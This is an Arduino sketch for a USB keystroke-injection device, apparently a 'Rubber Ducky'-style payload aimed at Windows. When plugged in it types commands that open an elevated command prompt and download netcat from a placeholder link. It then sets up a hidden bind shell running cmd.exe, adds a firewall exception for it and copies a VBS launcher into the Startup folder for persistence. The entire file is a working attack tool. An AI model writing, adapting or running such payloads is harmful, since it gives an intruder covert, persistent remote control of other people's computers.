#include <HID-Project.h>
#include <HID-Settings.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  AbsoluteMouse.begin();
  Keyboard.begin();

  // Start Payload
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(100);
  Keyboard.releaseAll();

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell Start-Process cmd -Verb RunAs");

  typeKey(KEY_RETURN);

  delay(1500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(121);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("cd %ROOT%");

  typeKey(KEY_RETURN);

  // --> Kills already running Netcat instance (if any)

  Keyboard.print("TASKKILL /im nc.exe /f");

  typeKey(KEY_RETURN);

  // --> Delete nc.exe file if it already exists

  Keyboard.print("erase /Q nc.exe");

  typeKey(KEY_RETURN);

  // --> Delete Start batch file if it already exists

  Keyboard.print("erase /Q Start.bat");

  typeKey(KEY_RETURN);

  // --> Delete Invisible.vbs in temp folder, if it already exists

  Keyboard.print("erase /Q invisible.vbs");

  typeKey(KEY_RETURN);

  // --> Delete invisible.vbs file in Startup if it already exists

  Keyboard.print("erase /Q \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\invisible.vbs\"");

  typeKey(KEY_RETURN);

  delay(500);

  // --> Downloads NetCat

  Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('http://[NETCAT_DOWNLOAD_LINK]/nc.exe','nc.exe')");

  typeKey(KEY_RETURN);

  delay(500);

  // --> Creates a batch file to start listening

  Keyboard.print("copy con Start.bat");

  typeKey(KEY_RETURN);

  Keyboard.print("cd %ROOT%");

  typeKey(KEY_RETURN);

  Keyboard.print("nc -lp [5555] -vv -e cmd.exe -L");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(122);
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  // --> Starts batch file invisibly

  Keyboard.print("copy con invisible.vbs");

  typeKey(KEY_RETURN);

  Keyboard.print("Set WshShell = CreateObject(\"WScript.Shell\" )");

  typeKey(KEY_RETURN);

  Keyboard.print("WshShell.Run chr(34) & \"%TEMP%\\Start.bat\" & Chr(34), 0");

  typeKey(KEY_RETURN);

  Keyboard.print("Set WshShell = Nothing");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(122);
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  // --> Add netcat to allowed programs list, enabling it to communicate through the firewall seamlessly

  Keyboard.print("netsh advfirewall firewall add rule name=\"Netcat\" dir=in action=allow program=\"%TEMP%\\nc.exe\" enable=yes");

  typeKey(KEY_RETURN);

  Keyboard.print("start invisible.vbs");

  typeKey(KEY_RETURN);

  delay(100);

  // --> Copies invisible.vbs to startup folder for persistence

  Keyboard.print("copy \"invisible.vbs\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\"");

  typeKey(KEY_RETURN);

  // --> Kills CMD while nc.exe continues running in background, remove Ducky after CMD closes

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
  AbsoluteMouse.end();
}

// Unused
void loop() {}